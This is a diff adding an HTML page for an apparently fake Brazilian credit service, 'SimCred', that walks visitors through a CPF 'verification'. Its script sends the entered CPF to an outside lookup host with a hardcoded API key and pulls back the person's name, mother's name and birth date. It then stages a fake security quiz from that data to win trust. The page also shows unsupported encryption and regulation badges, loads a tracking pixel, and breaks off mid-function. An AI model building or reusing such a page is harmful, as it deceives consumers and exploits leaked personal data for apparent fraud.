@@ -1,0 +1,1067 @@
+<!DOCTYPE html><html lang="pt-BR"><head><script src="/jquery-4.0.0.min.js"></script>
+  <script src="/js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script>
+  window.pixelId = "69122e1651618c82cbe95013";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SimCred – Verificação de Dados</title>
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700&family=Outfit:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Sora:wght@700;800&display=swap');
+
+    :root {
+      --green: #22C55E;
+      --green-dark: #1a9e4c;
+      --green-light: #d1fae5;
+      --green-subtle: #f0fdf4;
+      --navy: #042444;
+      --navy-dark: #021830;
+      --navy-light: #0a3a6e;
+      --bg: #F4F5F7;
+      --card: #FFFFFF;
+      --text: #042444;
+      --text-mid: #1e3a5f;
+      --text-light: #6B7280;
+      --border: #E5E7EB;
+      --border-light: #F3F4F6;
+      --radius: 18px;
+      --shadow: 0 4px 24px rgba(4,36,68,.08), 0 1px 2px rgba(4,36,68,.04);
+    }
+
+    *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+    
+    @media (hover: none) and (pointer: coarse) {
+      .btn-primary:hover {
+        transform: none;
+        box-shadow: 0 4px 15px rgba(34,197,94,.3);
+        background: var(--green);
+      }
+    }
+    
+    .btn-option:active {
+      border-color: var(--green);
+      background: var(--green-subtle);
+      transform: scale(0.98);
+    }
+    .btn-option:active .option-icon {
+      border-color: var(--green);
+      background: var(--green);
+    }
+    .btn-option:active .option-icon svg {
+      opacity: 1;
+    }
+    .btn-primary:active {
+      transform: scale(0.98);
+    }
+    
+    body{
+      background: var(--bg);
+      color: var(--text);
+      padding-top: 72px;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      font-family: 'DM Sans', sans-serif;
+    }
+
+    /* =================== HEADER =================== */
+    .header{
+      background: var(--navy);
+      padding: 12px 0;
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 1000;
+      box-shadow: 0 2px 12px rgba(4,36,68,0.3);
+    }
+    .header-content{
+      padding: 0 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      max-width: 420px;
+      margin: 0 auto;
+    }
+    .header-left{
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      flex: 1;
+    }
+    .menu-icon{
+      width: 40px;
+      height: 40px;
+      background: rgba(255,255,255,0.1);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      border: 1px solid rgba(255,255,255,0.15);
+    }
+    .menu-icon:hover{
+      background: rgba(255,255,255,0.18);
+      transform: scale(1.05);
+    }
+    .menu-icon svg{
+      width: 18px;
+      height: 18px;
+      color: rgba(255,255,255,0.85);
+      stroke-width: 2.5;
+    }
+    
+    /* LOGO */
+    .logo-wrap{
+      display: flex;
+      align-items: center;
+      text-decoration: none;
+    }
+    .logo-img{
+      height: 38px;
+      width: auto;
+      object-fit: contain;
+      display: block;
+    }
+
+    .header-right{
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .header-icon{
+      width: 36px;
+      height: 36px;
+      background: rgba(255,255,255,0.1);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      border: 1px solid rgba(255,255,255,0.15);
+      position: relative;
+    }
+    .header-icon:hover{
+      background: rgba(255,255,255,0.18);
+      transform: scale(1.05);
+    }
+    .header-icon svg{
+      width: 17px;
+      height: 17px;
+      color: rgba(255,255,255,0.85);
+      stroke-width: 2;
+    }
+    .notification-badge{
+      position: absolute;
+      top: -1px;
+      right: -1px;
+      width: 8px;
+      height: 8px;
+      background: #EF4444;
+      border-radius: 50%;
+      border: 2px solid var(--navy);
+    }
+    .user-avatar{
+      width: 36px;
+      height: 36px;
+      background: rgba(34,197,94,0.2);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      border: 2px solid var(--green);
+      color: var(--green);
+    }
+    .user-avatar svg{
+      width: 18px;
+      height: 18px;
+    }
+    .user-avatar:hover{
+      transform: scale(1.05);
+    }
+
+    /* =================== CONTAINER =================== */
+    .container{
+      max-width: 420px;
+      margin: auto;
+      padding: 20px;
+      padding-top: 28px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      flex: 1;
+      justify-content: center;
+      gap: 16px;
+    }
+
+    /* =================== STEP INDICATOR =================== */
+    .step-indicators{
+      display: flex;
+      align-items: flex-start;
+      gap: 0;
+      width: 100%;
+      padding: 0;
+    }
+    .card-divider{
+      height: 1px;
+      background: var(--border);
+      margin: 18px -24px 20px;
+    }
+    .step-dot{
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+      flex: 0 0 auto;
+      position: relative;
+      z-index: 2;
+    }
+    .step-dot .dot{
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      border: 2px solid var(--border);
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Outfit', sans-serif;
+      font-weight: 600;
+      font-size: 13px;
+      color: var(--text-light);
+      transition: all 0.35s ease;
+    }
+    .step-dot.active .dot{
+      border-color: var(--green);
+      background: var(--green);
+      color: #fff;
+      box-shadow: 0 2px 10px rgba(34,197,94,.3);
+    }
+    .step-dot.done .dot{
+      border-color: var(--green);
+      background: var(--green);
+      color: #fff;
+    }
+    .step-dot .dot-label{
+      font-size: 10px;
+      font-weight: 600;
+      color: var(--text-light);
+      letter-spacing: 0.2px;
+      white-space: nowrap;
+      transition: all 0.35s ease;
+    }
+    .step-dot.active .dot-label{
+      color: var(--navy);
+    }
+    .step-dot.done .dot-label{
+      color: var(--green-dark);
+    }
+    .step-line{
+      flex: 1;
+      height: 2px;
+      background: var(--border);
+      margin: 0 -2px;
+      margin-bottom: 20px;
+      transition: background 0.35s ease;
+    }
+    .step-line.done{
+      background: var(--green);
+    }
+
+    /* =================== CARD =================== */
+    .card{
+      background: var(--card);
+      border-radius: var(--radius);
+      padding: 28px 24px;
+      box-shadow: 0 8px 32px rgba(4,36,68,0.1), 0 1px 4px rgba(4,36,68,0.06);
+      border: 1px solid var(--border);
+      animation: fade .45s cubic-bezier(.22,.68,0,1);
+      width: 100%;
+    }
+    @keyframes fade{
+      from{opacity:0;transform:translateY(16px);}
+      to{opacity:1;transform:none;}
+    }
+
+    /* =================== PROGRESS BAR =================== */
+    .progress-bar{
+      background: var(--border-light);
+      height: 5px;
+      border-radius: 10px;
+      overflow: hidden;
+      margin-bottom: 24px;
+    }
+    .progress-fill{
+      height: 100%;
+      width: 0;
+      background: linear-gradient(90deg, var(--navy-light), var(--green));
+      border-radius: 10px;
+      transition: .4s cubic-bezier(.22,.68,0,1);
+    }
+
+    /* =================== STEP HEADER =================== */
+    .step-header{
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 4px;
+    }
+    .step-icon{
+      width: 40px;
+      height: 40px;
+      background: linear-gradient(135deg, var(--navy), var(--navy-light));
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 3px 12px rgba(4,36,68,.25);
+      flex-shrink: 0;
+    }
+    .step-icon svg{
+      width: 20px;
+      height: 20px;
+      color: white;
+    }
+    h1{
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.3rem;
+      font-weight: 700;
+      color: var(--navy);
+      letter-spacing: -0.3px;
+    }
+    .step-subtitle{
+      color: var(--text-light);
+      margin-top: 6px;
+      margin-bottom: 22px;
+      font-size: 14px;
+      line-height: 1.55;
+    }
+
+    /* =================== TRUST BADGE =================== */
+    .trust-bar{
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 18px;
+      padding: 10px 14px;
+      background: var(--green-subtle);
+      border-radius: 10px;
+      border: 1px solid #BBF7D0;
+    }
+    .trust-bar svg{
+      width: 16px;
+      height: 16px;
+      color: var(--green-dark);
+      flex-shrink: 0;
+    }
+    .trust-bar span{
+      font-size: 12px;
+      color: var(--green-dark);
+      font-weight: 500;
+      line-height: 1.4;
+    }
+
+    /* =================== FORM =================== */
+    .form-group{margin-bottom:18px;}
+    label{
+      font-weight: 600;
+      font-size: 13px;
+      margin-bottom: 6px;
+      display: block;
+      color: var(--navy);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    input{
+      width: 100%;
+      padding: 14px 16px;
+      border-radius: 12px;
+      border: 2px solid var(--border);
+      font-size: 16px;
+      font-family: 'DM Sans', sans-serif;
+      transition: all 0.2s ease;
+      background: #fff;
+      color: var(--navy);
+    }
+    input::placeholder{
+      color: #9CA3AF;
+    }
+    input:focus{
+      outline: none;
+      border-color: var(--green);
+      box-shadow: 0 0 0 3px rgba(34,197,94,.12);
+    }
+
+    /* =================== BUTTONS =================== */
+    .btn{
+      width: 100%;
+      padding: 15px;
+      border: none;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: 'DM Sans', sans-serif;
+      transition: all 0.25s ease;
+    }
+    .btn-primary{
+      background: linear-gradient(135deg, var(--green), var(--green-dark));
+      color: #FFFFFF;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 4px 15px rgba(34,197,94,.3);
+      letter-spacing: 0.2px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .btn-primary:hover{
+      transform: translateY(-2px);
+      box-shadow: 0 6px 24px rgba(34,197,94,.4);
+    }
+    .btn-primary::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      transition: left 0.5s;
+    }
+    .btn-primary:hover::after {
+      left: 100%;
+    }
+    .btn-primary:disabled{
+      opacity: 0.7;
+      cursor: not-allowed;
+      transform: none !important;
+    }
+
+    /* Spinner */
+    .spinner{
+      display: none;
+      width: 18px;
+      height: 18px;
+      border: 2.5px solid rgba(255,255,255,.35);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin .6s linear infinite;
+    }
+    @keyframes spin{to{transform:rotate(360deg);}}
+    .btn-primary.loading .spinner{ display: block; }
+    .btn-primary.loading .btn-text{ display: none; }
+
+    /* =================== OPTIONS =================== */
+    .btn-option{
+      width: 100%;
+      padding: 16px 18px;
+      border-radius: 14px;
+      border: 1.5px solid var(--border);
+      background: #FFFFFF;
+      text-align: left;
+      margin-bottom: 10px;
+      cursor: pointer;
+      font-family: 'DM Sans', sans-serif;
+      font-weight: 500;
+      font-size: 14.5px;
+      transition: all 0.2s ease;
+      color: var(--navy);
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      box-shadow: 0 1px 4px rgba(4,36,68,0.06);
+    }
+    @media (hover: hover) and (pointer: fine) {
+      .btn-option:hover{
+        border-color: var(--green);
+        background: var(--green-subtle);
+        transform: translateY(-1px);
+        box-shadow: 0 3px 10px rgba(34,197,94,0.1);
+      }
+      .btn-option:hover .option-icon{
+        border-color: var(--green);
+        background: var(--green);
+      }
+      .btn-option:hover .option-icon svg{
+        opacity: 1;
+      }
+    }
+    .btn-option .option-icon{
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      border: 2px solid #D4D7DC;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.2s ease;
+      flex-shrink: 0;
+      background: transparent;
+    }
+    .btn-option .option-icon svg{
+      width: 12px;
+      height: 12px;
+      color: white;
+      opacity: 0;
+      transition: opacity 0.2s ease;
+    }
+    .btn-option.selected{
+      border-color: var(--green);
+      background: var(--green-subtle);
+    }
+    .btn-option.selected .option-icon{
+      border-color: var(--green);
+      background: var(--green);
+    }
+    .btn-option.selected .option-icon svg{
+      opacity: 1;
+    }
+    .btn-confirm{
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-weight: 600;
+    }
+    .btn-confirm svg{
+      width: 18px;
+      height: 18px;
+    }
+    .btn-confirm.confirm-yes{
+      background: linear-gradient(135deg, var(--green), var(--green-dark));
+      border-color: var(--green);
+      color: #fff;
+      box-shadow: 0 4px 14px rgba(34,197,94,0.3);
+    }
+    .btn-confirm.confirm-yes:hover{
+      background: var(--green-dark);
+      border-color: var(--green-dark);
+      color: white;
+      box-shadow: 0 6px 20px rgba(34,197,94,0.35);
+      transform: translateY(-1px);
+    }
+    .btn-confirm.confirm-no{
+      background: #EF4444;
+      border-color: #EF4444;
+      color: #fff;
+      box-shadow: 0 4px 14px rgba(239,68,68,0.25);
+    }
+    .btn-confirm.confirm-no:hover{
+      background: #DC2626;
+      border-color: #DC2626;
+      box-shadow: 0 6px 20px rgba(239,68,68,0.3);
+      transform: translateY(-1px);
+    }
+
+    /* =================== DATE DISPLAY =================== */
+    .date-display{
+      text-align: center;
+      padding: 22px 20px;
+      border-radius: 14px;
+      background: linear-gradient(135deg, #f0fdf4, #e0f2fe);
+      border: 1.5px solid rgba(34,197,94,0.2);
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: var(--navy);
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      font-family: 'Outfit', sans-serif;
+      letter-spacing: 0.5px;
+      box-shadow: 0 1px 4px rgba(4,36,68,0.06);
+    }
+    .date-display svg{
+      width: 20px;
+      height: 20px;
+      opacity: 0.4;
+      color: var(--navy);
+    }
+
+    /* =================== SUCCESS =================== */
+    .success{text-align:center;padding:30px 10px;}
+    .success-icon{
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, var(--green), var(--green-dark));
+      color: #fff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+      box-shadow: 0 6px 24px rgba(34,197,94,.3);
+      animation: popIn .4s cubic-bezier(.22,.68,0,1);
+    }
+    @keyframes popIn{
+      from{transform:scale(0);opacity:0;}
+      to{transform:scale(1);opacity:1;}
+    }
+    .success-icon svg{
+      width: 38px;
+      height: 38px;
+    }
+    .success-text{
+      font-size: 14px;
+      color: var(--text-light);
+      line-height: 1.6;
+      margin-top: 8px;
+    }
+    .success-redirect{
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 16px;
+      padding: 12px;
+      background: var(--green-subtle);
+      border-radius: 10px;
+      border: 1px solid #BBF7D0;
+      font-size: 13px;
+      font-weight: 500;
+      color: var(--green-dark);
+    }
+    .success-redirect .mini-spinner{
+      width: 14px;
+      height: 14px;
+      border: 2px solid rgba(22,163,74,.3);
+      border-top-color: var(--green-dark);
+      border-radius: 50%;
+      animation: spin .6s linear infinite;
+    }
+
+    /* =================== FOOTER =================== */
+    footer.site-footer{
+      margin-top: auto;
+      background: var(--navy);
+      color: rgba(255,255,255,0.5);
+      padding: 24px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      border-top: 1px solid rgba(255,255,255,0.08);
+    }
+    .footer-inner{
+      max-width: 420px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+    .footer-logo{
+      display: flex;
+      align-items: center;
+    }
+    .footer-logo-img{
+      height: 36px;
+      width: auto;
+      object-fit: contain;
+      display: block;
+      filter: brightness(1.1);
+    }
+    footer small{
+      font-size: 11px;
+      opacity: 0.7;
+      line-height: 1.5;
+      color: rgba(255,255,255,0.5);
+    }
+    footer small strong{
+      color: var(--green);
+      font-weight: 600;
+    }
+    .footer-badges{
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-top: 4px;
+    }
+    .footer-badges span{
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      font-size: 10px;
+      color: rgba(255,255,255,0.4);
+      font-weight: 500;
+    }
+    .footer-badges svg{
+      width: 12px;
+      height: 12px;
+      color: var(--green);
+    }
+  </style>
+</head>
+
+<body>
+
+<header class="header">
+  <div class="header-content">
+    <div class="header-left">
+      <div class="menu-icon">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+        </svg>
+      </div>
+      <a href="index.html" class="logo-wrap">
+        <img src="/images/Sim-Cred.png" alt="SimCred" class="logo-img">
+      </a>
+    </div>
+    <div class="header-right">
+      <div class="header-icon">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path>
+        </svg>
+        <span class="notification-badge"></span>
+      </div>
+      <div class="user-avatar">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="18" height="18">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+        </svg>
+      </div>
+    </div>
+  </div>
+</header>
+
+<div class="container">
+
+  <div class="card">
+
+    <!-- STEP INDICATORS -->
+    <div class="step-indicators" id="stepIndicators">
+      <div class="step-dot active" id="ind1">
+        <div class="dot">1</div>
+        <span class="dot-label">CPF</span>
+      </div>
+      <div class="step-line" id="line1"></div>
+      <div class="step-dot" id="ind2">
+        <div class="dot">2</div>
+        <span class="dot-label">Identidade</span>
+      </div>
+      <div class="step-line" id="line2"></div>
+      <div class="step-dot" id="ind3">
+        <div class="dot">3</div>
+        <span class="dot-label">Nascimento</span>
+      </div>
+      <div class="step-line" id="line3"></div>
+      <div class="step-dot" id="ind4">
+        <div class="dot">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="14" height="14">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"></path>
+          </svg>
+        </div>
+        <span class="dot-label">Pronto</span>
+      </div>
+    </div>
+
+    <div class="card-divider"></div>
+
+    <div class="progress-bar"><div class="progress-fill" id="progressFill" style="width: 25%;"></div></div>
+
+    <!-- STEP 1 -->
+    <div class="step" id="step1" style="display: block;">
+      <div class="step-header">
+        <div class="step-icon">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+          </svg>
+        </div>
+        <h1>Vamos começar!</h1>
+      </div>
+      <p class="step-subtitle">Informe seu CPF para verificarmos seus dados e liberar as melhores ofertas de crédito disponíveis para você.</p>
+
+      <form id="step1Form">
+        <div class="form-group">
+          <label>Seu CPF</label>
+          <input type="tel" id="cpf" inputmode="numeric" placeholder="000.000.000-00" required="">
+        </div>
+
+        <button type="submit" class="btn btn-primary" id="submitBtn1">
+          <span class="btn-text">Verificar meu CPF</span>
+          <span class="spinner"></span>
+        </button>
+      </form>
+
+      <div class="trust-bar">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+        </svg>
+        <span>Seus dados estão protegidos com criptografia de ponta a ponta.</span>
+      </div>
+    </div>
+
+    <!-- STEP 2 -->
+    <div class="step" id="step2" style="display:none;">
+      <div class="step-header">
+        <div class="step-icon">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+          </svg>
+        </div>
+        <h1>Verificação de segurança</h1>
+      </div>
+      <p class="step-subtitle">Para sua proteção, selecione abaixo o nome correto da sua mãe.</p>
+      <div id="opcoesMae"></div>
+
+      <div class="trust-bar">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+        </svg>
+        <span>Etapa obrigatória para garantir a segurança da sua conta.</span>
+      </div>
+    </div>
+
+    <!-- STEP 3 -->
+    <div class="step" id="step3" style="display:none;">
+      <div class="step-header">
+        <div class="step-icon">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
+          </svg>
+        </div>
+        <h1>Confirme seu nascimento</h1>
+      </div>
+      <p class="step-subtitle">Última etapa! Verifique se a data de nascimento abaixo está correta.</p>
+      <div class="date-display" id="dataNascimentoBox">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
+        </svg>
+        <span id="dataText"></span>
+      </div>
+      <button class="btn-option btn-confirm confirm-yes" id="dataOkSim">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+        </svg>
+        Sim, está correto
+      </button>
+      <button class="btn-option btn-confirm confirm-no" id="dataOkNao">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+        </svg>
+        Não, está incorreto
+      </button>
+    </div>
+
+    <!-- STEP 4 -->
+    <div class="step" id="step4" style="display:none;">
+      <div class="success">
+        <div class="success-icon">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"></path>
+          </svg>
+        </div>
+        <h1>Verificação concluída!</h1>
+        <p class="success-text" id="mensagemFinal"></p>
+        <div class="success-redirect">
+          <span class="mini-spinner"></span>
+          Preparando suas ofertas de crédito...
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-logo">
+      <img src="/images/Sim-Cred.png" alt="SimCred" class="footer-logo-img">
+    </div>
+    <small><strong>SimCred Soluções Financeiras Ltda.</strong><br>
+    CNPJ: 36.947.229/0001-85 – São Paulo, SP – 01310-200</small>
+    <div class="footer-badges">
+      <span>
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+        SSL Seguro
+      </span>
+      <span>
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+        Dados protegidos
+      </span>
+      <span>
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"></path></svg>
+        Instituição regulada
+      </span>
+    </div>
+  </div>
+</footer>
+
+<script>
+const progressFill = document.getElementById('progressFill');
+
+function updateIndicators(n){
+  for(let i=1;i<=4;i++){
+    const ind = document.getElementById('ind'+i);
+    const line = document.getElementById('line'+i);
+    ind.classList.remove('active','done');
+    if(i < n) ind.classList.add('done');
+    if(i === n) ind.classList.add('active');
+    if(line){
+      line.classList.remove('done');
+      if(i < n) line.classList.add('done');
+    }
+  }
+}
+
+function showStep(n){
+  document.querySelectorAll('.step').forEach(s=>s.style.display='none');
+  document.getElementById('step'+n).style.display='block';
+  progressFill.style.width = `${n*25}%`;
+  updateIndicators(n);
+}
+
+document.getElementById('step1Form').addEventListener('submit', async e=>{
+  e.preventDefault();
+
+  const cpf = document.getElementById('cpf').value.replace(/\D/g,'');
+  const btn = document.getElementById('submitBtn1');
+
+  if(cpf.length !== 11){
+    alert('CPF inválido. Digite 11 dígitos.');
+    return;
+  }
+
+  btn.classList.add('loading');
+  btn.disabled = true;
+
+  localStorage.setItem('cpf', cpf);
+
+  try{
+    const url = `https://localizaelu.online/cpf/${cpf}`;
+    const res = await fetch(url, {
+      headers: { 'x-api-key': 'cpf_70fde9_ee43d3c74e61e19ccd7701f6697d1bab9ae6100cf55b37bd' }
+    });
+    const data = await res.json();
+
+    if(!res.ok || !data.birth_date){
+      btn.classList.remove('loading');
+      btn.disabled = false;
+      alert(data.message || 'Não foi possível consultar o CPF. Tente novamente.');
+      return;
+    }
+
+    const [y,m,d] = data.birth_date.split('-');
+    const dataNascBR = `${d}/${m}/${y}`;
+
+    localStorage.setItem('nome', (data.name || 'Cliente').trim());
+    localStorage.setItem('nome_mae', (data.mother_name || 'NENHUMA DAS OPÇÕES').trim());
+    localStorage.setItem('data_nasc', dataNascBR);
+
+    btn.classList.remove('loading');
+    btn.disabled = false;
+
+    showStep(2);
+    renderStep2();
+
+  }catch(err){
+    btn.classList.remove('loading');
+    btn.disabled = false;
+    console.error('Erro na consulta:', err);
+    alert('Erro ao consultar CPF: ' + err.message);
+  }
+});
+
+function renderStep2(){
+  const mae = localStorage.getItem('nome_mae');
+  const hasMae = mae && mae !== 'NENHUMA DAS OPÇÕES' && mae.trim() !== '';
+
+  const nenhuma = 'NENHUMA DAS ALTERNATIVAS';
+
+  const fakeNames = [
+    'MARIA APARECIDA DOS SANTOS','ANA PAULA OLIVEIRA','PATRICIA SOUZA LIMA',
+    'LUANA FERREIRA COSTA','SANDRA REGINA ALVES','CLAUDIA MARIA PEREIRA',
+    'ROSANGELA SILVA NASCIMENTO','FRANCISCA ALMEIDA ROCHA','LUCIANA BARBOSA MARTINS',
+    'ADRIANA RIBEIRO GOMES','SIMONE CARVALHO DIAS','MARCIA FERNANDES ARAUJO'
+  ];
+
+  if(hasMae){
+    const correct = mae.toUpperCase();
+    const shuffledFakes = fakeNames.filter(f => f !== correct).sort(() => Math.random() - 0.5);
+    const opts = [correct, shuffledFakes[0], shuffledFakes[1], nenhuma]
+      .sort(() => Math.random() - 0.5);
+    renderOpcoes(opts, correct);
+  } else {
+    const shuffledFakes = fakeNames.sort(() => Math.random() - 0.5);
+    const opts = [shuffledFakes[0], shuffledFakes[1], shuffledFakes[2], nenhuma]
+      .sort(() => Math.random() - 0.5);
+    renderOpcoes(opts, nenhuma);
+  }
+}
+
+function renderOpcoes(opts, correct){
+  const box = document.getElementById('opcoesMae');
+  box.innerHTML = '';
+
+  opts.forEach(o => {
+    const b = document.createElement('button');
+    b.className = 'btn-option';
+    b.innerHTML = `<span class="option-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg></span>${o}`;
+    b.onclick = () => {
+      box.querySelectorAll('.btn-option').forEach(btn => btn.classList.remove('selected'));
+      b.classList.add('selected');
+      
+      if(o === correct){
+        setTimeout(() => { showStep(3); renderStep3(); }, 400);
+      } else {
+        setTimeout(() => {
+          alert('Opção incorreta. Tente novamente.');
+          b.classList.remove('selected');
+        }, 400);
+      }
+    };
+    box.appendChild(b);
+  });
+}
+
+function renderStep3(){
+  document.getElementById('dataText').innerText =
+    localStorage.getItem('data_nasc');
+
+  dataOkSim.onclick=()=>{showStep(4);renderStep4();}
+  dataOkNao.onclick=()=>alert('Verifique seus dados e entre em contato com o suporte.');
+}
+
+function renderStep4(){
+  const nome = localStorage.getItem('nome');
+  mensagemFinal.innerText =
+    `Tudo certo, ${nome}! Sua identidade foi confirmada com sucesso.`;
+
+  setTimeout(()=>{
+    window.location.href='/3';
+  },3000);
+}
+
+document.getElementById('cpf').addEventListener('input', function(e){
+  let value = e.target.value.replace(/\D/g,'');
+  if(value.length > 11) value = value.slice(0,11);
+  
+  if(value.length > 9){
